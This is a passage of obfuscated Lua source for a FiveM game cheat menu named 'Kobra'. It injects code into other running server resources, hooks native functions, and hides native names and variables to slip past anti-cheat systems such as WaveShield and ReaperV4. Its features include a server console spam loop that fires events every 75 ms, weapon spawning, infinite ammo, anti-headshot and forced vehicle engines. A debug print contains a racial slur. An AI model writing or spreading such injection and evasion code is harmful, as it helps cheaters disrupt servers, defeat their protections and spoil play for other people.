                                        _G.KobraServerConsoleSpamEnabled = true
                                        _G.KobraServerConsoleSpamInitialized = true

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("CreateThread", function(fn, cb) return fn(cb) end)
                                        HookNative("Wait", function(fn, ms) return fn(ms) end)
                                        HookNative("TriggerEvent", function(fn, ...) return fn(...) end)
                                        HookNative("TriggerServerEvent", function(fn, ...) return fn(...) end)

                                        if not _G.Kobra then
                                            _G.Kobra = {
                                                TEvent = function(e, ...) return TriggerEvent(e, ...) end,
                                                TSEvent = function(e, ...) return TriggerServerEvent(e, ...) end
                                            }
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Spam Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(500) -- Anti-detection delay
                                            while _G.KobraServerConsoleSpamInitialized do
                                                if not _G.KobraServerConsoleSpamEnabled then
                                                    Citizen.Wait(500)
                                                else
                                                    _G.Kobra.TSEvent("playerLoaded")
                                                    Citizen.Wait(75)
                                                end
                                            end
                                        end)
                                    else
                                        _G.KobraServerConsoleSpamEnabled = true
                                    end
                                ]]);else local v610=111 -(61 + 50) ;while true do if (v610==(0 + 0)) then print("Console Spam Stopped...");v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                    _G.KobraServerConsoleSpamEnabled = false
                                ]]);break;end end end end}}}}},{icon="",label="Weapon",type="subMenu",categories={{label="Spawner",tabs={{type="button",label="Give Weapon",onSelect=function() v60("Weapon Name","WEAPON_",function(v560) if (v560 and (v560~="")) then v277:SpawnSelectedWeapon(v560);end end,"typeable");end},{type="button",label="Give All Weapons",onSelect=function() v277:GiveAllWeapons();end},{type="button",label="Remove All Weapons",onSelect=function() v277:RemoveAllWeapons();end},{type="divider",label="All Weapons"},{type="scrollable",label="Melee",scrollType="onEnter",value=1,values=v277:BuildMenuFromWeaponList({"weapon_unarmed","weapon_knife","weapon_dagger","weapon_bat","weapon_bottle","weapon_crowbar","weapon_golfclub","weapon_hammer","weapon_hatchet","weapon_machete","weapon_switchblade","weapon_nightstick","weapon_wrench"}),onSelect=function(v417) v277:SpawnSelectedWeapon(v277:GetWeaponModelFromLabel(v417));end},{type="scrollable",label="Handguns",scrollType="onEnter",value=1,values=v277:BuildMenuFromWeaponList({"weapon_pistol","weapon_pistol_mk2","weapon_combatpistol","weapon_appistol","weapon_stungun","weapon_pistol50","weapon_snspistol","weapon_heavypistol","weapon_vintagepistol","weapon_flaregun"}),onSelect=function(v418) v277:SpawnSelectedWeapon(v277:GetWeaponModelFromLabel(v418));end},{type="scrollable",label="SMGs",scrollType="onEnter",value=2 -1 ,values=v277:BuildMenuFromWeaponList({"weapon_microsmg","weapon_smg","weapon_smg_mk2","weapon_assaultsmg","weapon_machinepistol","weapon_minismg","weapon_combatpdw"}),onSelect=function(v419) v277:SpawnSelectedWeapon(v277:GetWeaponModelFromLabel(v419));end},{type="scrollable",label="Rifles",scrollType="onEnter",value=4 -3 ,values=v277:BuildMenuFromWeaponList({"weapon_assaultrifle","weapon_assaultrifle_mk2","weapon_carbinerifle","weapon_carbinerifle_mk2","weapon_advancedrifle","weapon_specialcarbine","weapon_bullpuprifle","weapon_gusenberg","weapon_compactrifle","weapon_bullpuprifle_mk2","weapon_marksmanrifle"}),onSelect=function(v420) v277:SpawnSelectedWeapon(v277:GetWeaponModelFromLabel(v420));end},{type="scrollable",label="Shotguns",scrollType="onEnter",value=1 + 0 ,values=v277:BuildMenuFromWeaponList({"weapon_pumpshotgun","weapon_pumpshotgun_mk2","weapon_sawnoffshotgun","weapon_assaultshotgun","weapon_bullpupshotgun","weapon_heavyshotgun","weapon_autoshotgun"}),onSelect=function(v421) v277:SpawnSelectedWeapon(v277:GetWeaponModelFromLabel(v421));end},{type="scrollable",label="Snipers",scrollType="onEnter",value=1,values=v277:BuildMenuFromWeaponList({"weapon_sniperrifle","weapon_heavysniper","weapon_heavysniper_mk2","weapon_marksmanrifle","weapon_marksmanrifle_mk2"}),onSelect=function(v422) v277:SpawnSelectedWeapon(v277:GetWeaponModelFromLabel(v422));end},{type="scrollable",label="Explosives",scrollType="onEnter",value=1 + 0 ,values=v277:BuildMenuFromWeaponList({"weapon_grenade","weapon_stickybomb","weapon_molotov","weapon_pipebomb","weapon_proxmine","weapon_rpg","weapon_grenadelauncher","weapon_rpg","weapon_minigun","weapon_firework"}),onSelect=function(v423) v277:SpawnSelectedWeapon(v277:GetWeaponModelFromLabel(v423));end},{type="scrollable",label="Heavy",scrollType="onEnter",value=1,values=v277:BuildMenuFromWeaponList({"weapon_mg","weapon_combatmg","weapon_gusenberg","weapon_minigun","weapon_grenadelauncher","weapon_railgun","weapon_hominglauncher","weapon_compactlauncher"}),onSelect=function(v424) v277:SpawnSelectedWeapon(v277:GetWeaponModelFromLabel(v424));end},{type="scrollable",label="Throwables",scrollType="onEnter",value=329 -(287 + 41) ,values=v277:BuildMenuFromWeaponList({"weapon_ball","weapon_flare","weapon_smokegrenade","weapon_bzgas","weapon_petrolcan"}),onSelect=function(v425) v277:SpawnSelectedWeapon(v277:GetWeaponModelFromLabel(v425));end}}},{label="Combat",tabs={{type="button",label="Test Button",onSelect=function() print("hi");end},{type="checkbox",label="Infinite Ammo ",desc="Infinite Ammo, this might be detected on certain servers",checked=false,onSelect=function(v426) if v426 then v277:Notify("success","Kobra","Enabled Infinite Ammo",23359 -18359 );v277:EnableInfiniteAmmo();else local v611=0 + 0 ;while true do if (v611==(0 + 0)) then v277:Notify("error","Kobra","Disabled Infinite Ammo",1594 + 3406 );v277:DisableInfiniteAmmo();break;end end end end},{type="checkbox",label="Anti-Headshot",checked=false,desc="This will prevent you from being headshot.",onSelect=function(v427) if v427 then local v612=0 -0 ;while true do if (v612==0) then v277:Notify("success","Kobra","Enabled Anti-Headshot",1625 + 3375 );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n) return _G[decode(n)] end

                                            -- native wrappers (obfuscated lookup style)
                                            local SetPedSuffersCriticalHits = g({83,101,116,80,101,100,83,117,102,102,101,114,115,67,114,105,116,105,99,97,108,72,105,116,115})
                                            local PlayerPedId_fn = g({80,108,97,121,101,114,80,101,100,73,100})
                                            local Wait_fn = g({87,97,105,116})

                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                -- initFlow (coroutine runner) — copy of your project's coroutine runner pattern
                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[AntiHeadshot] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.antiHeadshotEnabled and not Unloaded do
                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits(ped, false)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                local CreateThread_fn = CreateThread
                                                local Wait_fn = Wait
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetPedSuffersCriticalHits_fn = SetPedSuffersCriticalHits

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait_fn(0)
                                                        if not _G.antiHeadshotEnabled then
                                                            Wait_fn(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits_fn(ped, false)
                                                        end

                                                        ::continue::
                                                    end
                                                end)
                                            end
                                            _G.antiHeadshotEnabled = true
                                        ]]);end break;end end else local v613=0 + 0 ;while true do if ((0 -0)==v613) then v277:Notify("error","Kobra","Disabled Anti-Headshot",4487 + 513 );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            -- simply clear the flag; coroutine loop will stop
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false
                                        ]]);else v48("any",[[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false

                                            -- try to restore default behavior once (best-effort)
                                            if PlayerPedId and SetPedSuffersCriticalHits then
                                                local ped = PlayerPedId()
                                                if ped and ped ~= 0 then
                                                    pcall(function() SetPedSuffersCriticalHits(ped, true) end)
                                                end
                                            end
                                        ]]);end break;end end end end}}}}},{icon="",label="Vehicle",type="subMenu",categories={{label="Spawner",tabs={{type="checkbox",label="Teleport Into",desc="If selected, this will teleport you into the selected vehicle.",checked=false,onSelect=function(v428) v43=v428 or false ;end},{type="checkbox",label="Delete Previous",desc="If selected, this will delete your previous vehicle when spawning selected vehicle.",checked=false,onSelect=function(v429) v42=v429 or false ;end},{type="divider",label="All Vehicles"},{type="button",label="Addon",onSelect=function() v60("Addon Vehicle","",function(v561) if (v561 and (v561~="")) then v277:SpawnSelectedVehicle(v561,v43,v42);end end,"typeable");end},{icon="ph ph-car",label="Compacts",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"asbo","blista","brioso","brioso2","brioso3","club","dilettante","dilettante2","issi2","issi3","issi4","issi5","issi6","kanjo","panto","prairie","rhapsody","weevil"},onSelect=function(v430) v277:SpawnSelectedVehicle(v430,v43,v42);end},{icon="ph ph-car",label="Sedans",type="scrollable",scrollType="onEnter",value=1 -0 ,values={"asea","asea2","asterope","asterope2","cinquemila","driftchavosv6","cog55","cog552","cognoscenti","cognoscenti2","deity","hardy","drifthardy","emperor","emperor2","emperor3","fugitive","glendale","glendale2","impaler5","ingot","intruder","minimus","limo2","premier","primo","primo2","regina","rhinehart","romero","schafter2","schafter5","schafter6","stafford","stanier","stratum","stretch","superd","surge","tailgater","tailgater2","warrener","warrener2","washington"},onSelect=function(v431) v277:SpawnSelectedVehicle(v431,v43,v42);end},{icon="ph ph-car",label="SUVs",type="scrollable",scrollType="onEnter",value=1,values={"aleutian","astron","baller","baller2","baller3","baller4","baller5","baller6","baller7","baller8","bjxl","cavalcade","cavalcade2","cavalcade3","contender","dorado","dubsta","dubsta2","everon3","fq2","granger","granger2","gresley","habanero","huntley","issi8","iwagen","jubilee","landstalker","landstalker2","mesa","mesa2","novak","patriot","patriot2","radi","rebla","rocoto","seminole","seminole2","serrano","squaddie","toros","vivanite","woodlander","xls","xls2"},onSelect=function(v432) v277:SpawnSelectedVehicle(v432,v43,v42);end},{icon="ph ph-car",label="Coupes",type="scrollable",scrollType="onEnter",value=1 -0 ,values={"cogcabrio","driftfr36","exemplar","f620","felon","felon2","fr36","jackal","kanjosj","oracle","oracle2","postlude","previon","sentinel","sentinel2","windsor","windsor2","zion","zion2"},onSelect=function(v433) v277:SpawnSelectedVehicle(v433,v43,v42);end},{icon="ph ph-car",label="Muscles",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"blade","brigham","broadway","buccaneer","buccaneer2","buffalo4","buffalo5","chino","chino2","clique","clique2","coquette3","deviant","dominator","dominator2","dominator3","dominator4","dominator5","dominator6","dominator7","dominator8","dominator9","driftdominator10","driftyosemite","dukes","dukes2","dukes3","ellie","eudora","faction","faction2","faction3","gauntlet","gauntlet2","gauntlet3","gauntlet4","gauntlet5","driftgauntlet4","greenwood","hermes","hotknife","hustler","impaler","impaler2","impaler3","impaler4","impaler6","imperator","imperator2","imperator3","lurcher","manana2","moonbeam","moonbeam2","nightshade","peyote2","phoenix","picador","ratloader","ratloader2","ruiner","ruiner2","ruiner3","ruiner4","sabregt","sabregt2","slamvan","slamvan2","slamvan3","slamvan4","slamvan5","slamvan6","stalion","stalion2","tahoma","tampa","tampa3","tampa4","tulip","tulip2","vamos","vigero","vigero2","vigero3","virgo","virgo2","virgo3","voodoo","voodoo2","weevil2","yosemite","yosemite2"},onSelect=function(v434) v277:SpawnSelectedVehicle(v434,v43,v42);end},{icon="ph ph-car",label="Sports Classic",type="scrollable",scrollType="onEnter",value=1590 -(877 + 712) ,values={"ardent","btype","btype2","btype3","casco","cheburek","cheetah2","cheetah3","coquette2","deluxo","dynasty","fagaloa","feltzer3","gt500","infernus2","jb700","jb7002","mamba","manana","michelli","monroe","nebula","peyote","peyote3","pigalle","rapidgt3","retinue","retinue2","savestra","stinger","stingergt","stromberg","swinger","toreador","torero","tornado","tornado2","tornado3","tornado4","tornado5","tornado6","turismo2","viseris","z190","zion3","ztype"},onSelect=function(v435) v277:SpawnSelectedVehicle(v435,v43,v42);end},{icon="ph ph-car",label="Sports",type="scrollable",value=1 + 0 ,values={"alpha","banshee","bestiagts","blista2","blista3","buffalo","buffalo2","buffalo3","calico","carbonizzare","comet2","comet3","comet4","comet5","comet6","comet7","coquette","coquette4","corsita","coureur","cypher","drafter","drifteuros","driftfuto","driftjester","driftremus","drifttampa","driftzr350","elegy","elegy2","euros","everon2","feltzer2","flashgt","furoregt","fusilade","futo","futo2","gauntlet6","gb200","growler","hotring","imorgon","issi7","italigto","italirsx","jester","jester2","jester3","jester4","jugular","khamelion","komoda","kuruma","kuruma2","locust","lynx","massacro","massacro2","neo","neon","ninef","ninef2","omnis","omnisegt","panthere","paragon","paragon2","pariah","penumbra","penumbra2","r300","raiden","rapidgt","rapidgt2","rapidgt4","raptor","remus","revolter","rt3000","ruston","schafter3","schafter4","schlagen","schwarzer","sentinel3","sentinel4","sentinel5","seven70","sm722","specter","specter2","stingertt","streiter","sugoi","sultan","sultan2","sultan3","surano","tampa2","tenf","tenf2","tropos","vectre","verlierer2","veto","veto2","vstr","zr350","zr380","zr3802","zr3803"},onSelect=function(v436) v277:SpawnSelectedVehicle(v436,v43,v42);end},{icon="ph ph-car",label="Super",type="scrollable",scrollType="onEnter",value=1796 -(730 + 1065) ,values={"adder","autarch","banshee2","bullet","champion","cheetah","cyclone","deveste","emerus","entity2","entity3","entityxf","fmj","furia","gp1","ignus","infernus","italigtb","italigtb2","krieger","le7b","lm87","nero","nero2","osiris","penetrator","pfister811","prototipo","reaper","s80","sc1","scramjet","sheava","sultanrs","suzume","t20","taipan","tempesta","tezeract","thrax","tigon","torero2","turismo3","turismor","tyrant","tyrus","vacca","vagner","vigilante","virtue","visione","voltic","voltic2","xa21","zeno","zentorno","zorrusso"},onSelect=function(v437) v277:SpawnSelectedVehicle(v437,v43,v42);end},{icon="ph ph-car",label="Motorcycles",type="scrollable",scrollType="onEnter",value=2000 -(1864 + 135) ,values={"akuma","avarus","bagger","bati","bati2","bf400","carbonrs","chimera","cliffhanger","daemon","daemon2","deathbike","deathbike2","deathbike3","defiler","diablous","diablous2","double","enduro","esskey","faggio","faggio2","faggio3","fcr","fcr2","gargoyle","hakuchou","hakuchou2","hexer","innovation","lectro","manchez","manchez2","manchez3","nemesis","nightblade","oppressor","oppressor2","pcj","powersurge","ratbike","reever","rrocket","ruffian","sanchez","sanchez2","sanctus","shinobi","shotaro","sovereign","stryder","thrust","vader","vindicator","vortex","wolfsbane","zombiea","zombieb"},onSelect=function(v438) v277:SpawnSelectedVehicle(v438,v43,v42);end},{icon="ph ph-car",label="Off-Road",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"bfinjection","bifta","blazer","blazer2","blazer3","blazer4","blazer5","bodhi2","boor","brawler","bruiser","bruiser2","bruiser3","brutus","brutus2","brutus3","caracara","caracara2","dloader","draugur","driftl352","dubsta3","dune","dune2","dune3","dune4","dune5","freecrawler","hellion","insurgent","insurgent2","insurgent3","kalahari","kamacho","l35","l352","marshall","menacer","mesa3","monster","monster3","monster4","monster5","monstrociti","nightshark","outlaw","patriot3","rancherxl","rancherxl2","ratel","rcbandito","rebel","rebel2","riata","sandking","sandking2","technical","technical2","technical3","terminus","trophytruck","trophytruck2","vagrant","verus","winky","yosemite3","zhaba"},onSelect=function(v439) v277:SpawnSelectedVehicle(v439,v43,v42);end},{icon="ph ph-car",label="Industrial",type="scrollable",scrollType="onEnter",value=1,values={"bulldozer","cutter","dump","flatbed","flatbed2","guardian","handler","mixer","mixer2","rubble","tiptruck","tiptruck2"},onSelect=function(v440) v277:SpawnSelectedVehicle(v440,v43,v42);end},{icon="ph ph-car",label="Utility",type="scrollable",scrollType="onEnter",value=1,values={"airtug","armytanker","armytrailer","armytrailer2","baletrailer","boattrailer","boattrailer2","boattrailer3","caddy","caddy2","caddy3","docktrailer","docktug","forklift","freighttrailer","graintrailer","mower","proptrailer","raketrailer","ripley","sadler","sadler2","scrap","slamtruck","tanker","tanker2","towtruck","towtruck2","towtruck3","towtruck4","tr2","tr3","tr4","tractor","tractor2","tractor3","trailerlarge","trailerlogs","trailers","trailers2","trailers3","trailers4","trailers5","trailersmall","trflat","tvtrailer","tvtrailer2","utillitruck","utillitruck2","utillitruck3"},onSelect=function(v441) v277:SpawnSelectedVehicle(v441,v43,v42);end},{icon="ph ph-car",label="Vans",type="scrollable",scrollType="onEnter",value=1125 -(408 + 716) ,values={"bison","bison2","bison3","bobcatxl","boxville","boxville2","boxville3","boxville4","boxville5","boxville6","burrito","burrito2","burrito3","burrito4","burrito5","camper","gburrito","gburrito2","journey","journey2","minivan","minivan2","paradise","pony","pony2","rumpo","rumpo2","rumpo3","speedo","speedo2","speedo4","speedo5","surfer","surfer2","surfer3","taco","youga","youga2","youga3","youga4"},onSelect=function(v442) v277:SpawnSelectedVehicle(v442,v43,v42);end}}},{label="Vehicle Customization",tabs={{type="button",label="Set License Plate",onSelect=function() v60("Set License Plate","",function(v562) if (v562 and (v562~="")) then local v746=0 + 0 ;local v747;while true do if (v746==(0 + 0)) then v747=string.format([[
                                            local function xKqLZVwPt9()
                                                local XcVbNmAsDfGhJkL = PlayerPedId
                                                local TyUiOpZxCvBnMzLk = GetVehiclePedIsIn
                                                local PoIuYtReWqAzXsDc = _G.SetVehicleNumberPlateText

                                                local pEd = XcVbNmAsDfGhJkL()
                                                local vEh = TyUiOpZxCvBnMzLk(pEd, false)

                                                if vEh and vEh ~= 0 then
                                                    PoIuYtReWqAzXsDc(vEh, "%s")
                                                end
                                            end

                                            xKqLZVwPt9()
                                        ]],v562);MachoInjectResourceRaw("any",v747);break;end end else v12:Notify("Invalid input","Please enter a valid license plate.","error");end end,"typeable");end},{type="button",label="Repair Vehicle",onSelect=function() v277:RepairVehicle();end},{type="button",label="Clean Vehicle",onSelect=function() v12:Notify("success","Kobra","Cleaned Vehicle",8788 -5788 );MachoInjectResourceRaw("any",[[
                            local function qPwRYKz7mL()
                                local a = PlayerPedId
                                local b = GetVehiclePedIsIn
                                local c = SetVehicleDirtLevel

                                local ped = a()
                                local veh = b(ped, false)
                                if veh and veh ~= 0 then
                                    c(veh, 0.0)
                                end
                            end

                            qPwRYKz7mL()
                            ]]);end},{type="button",label="Force Vehicle Engine",onSelect=function() v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return false end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return false end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
                                GhYtReFdCxWaQzLp = true

                                local function OpAsDfGhJkLzXcVb()
                                    local lMnbVcXzZaSdFg = CreateThread
                                    lMnbVcXzZaSdFg(function()
                                        local QwErTyUiOp         = _G.PlayerPedId
                                        local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                                        local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                                        local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                                        local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                                        local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                                        local En_g_Health_Get    = _G.GetVehicleEngineHealth
                                        local En_g_Health_Set    = _G.SetVehicleEngineHealth
                                        local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                                        local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                                        local function _tick(vh)
                                            if vh and vh ~= 0 then
                                                No_Hotwire_Set(vh, false)
                                                En_g_Degrade_Set(vh, false)
                                                ErTyUiOpAsDfGh(vh, false)
                                                KeEpOnAb(vh, true)

                                                local eh = En_g_Health_Get(vh)
                                                if (not eh) or eh < 300.0 then
                                                    En_g_Health_Set(vh, 900.0)
                                                end

                                                ZxCvBnMqWeRtYu(vh, true, true, true)
                                            end
                                        end

                                        while GhYtReFdCxWaQzLp and not Unloaded do
                                            local p  = QwErTyUiOp()

                                            _tick(AsDfGhJkLz(p, false))
                                            _tick(TyUiOpAsDfGh(p))
                                            _tick(AsDfGhJkLz(p, true))

                                            Wait(0)
                                        end
                                    end)
                                end

                                OpAsDfGhJkLzXcVb()
                            ]]);end,function() v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                GhYtReFdCxWaQzLp = false
                                local v = GetVehiclePedIsIn(PlayerPedId(), false)
                                if v and v ~= 0 then
                                    SetVehicleKeepEngineOnWhenAbandoned(v, false)
                                    SetVehicleEngineCanDegrade(v, true)
                                    SetVehicleUndriveable(v, false)
                                end
                            ]]);end},{type="button",label="Max Upgrade",onSelect=function() local v443=0 -0 ;local v444;local v445;while true do if (v443==(0 + 0)) then v12:Notify("success","Kobra","Vehicle Max Upgraded",3000);v444=GetResourceState("WaveShield")=="started" ;v443=1;end if (v443==(1 + 0)) then v445=GetResourceState("ReaperV4")=="started" ;if v444 then local v864=0;while true do if (v864==(585 -(217 + 368))) then print("WaveNiggaStarted");MachoInjectResourceRaw("any",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);break;end end elseif v445 then local v997=0 -0 ;while true do if (v997==0) then print("using Reaper fallback");MachoInjectThread(0 + 0 ,"any","",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
